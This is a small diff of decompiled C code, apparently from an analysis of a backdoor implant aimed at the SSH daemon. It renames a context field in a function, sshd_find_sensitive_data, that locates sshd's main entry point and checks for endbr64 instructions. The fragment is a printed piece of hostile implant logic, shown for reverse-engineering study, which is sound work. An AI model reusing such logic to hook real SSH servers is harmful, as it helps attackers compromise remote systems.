@@ -133,7 +133,7 @@ BOOL sshd_find_sensitive_data
   if (BVar6 == FALSE) {
     return FALSE;
   }
-  ctx->sshd_main = sshd_main_addr;
+  ctx->sshd_main_entry = sshd_main_addr;
   BVar6 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
   ctx->uses_endbr64 = (uint)(BVar6 != FALSE);
   code_segment_end = (u8 *)((long)pvVar11 + uVar3);
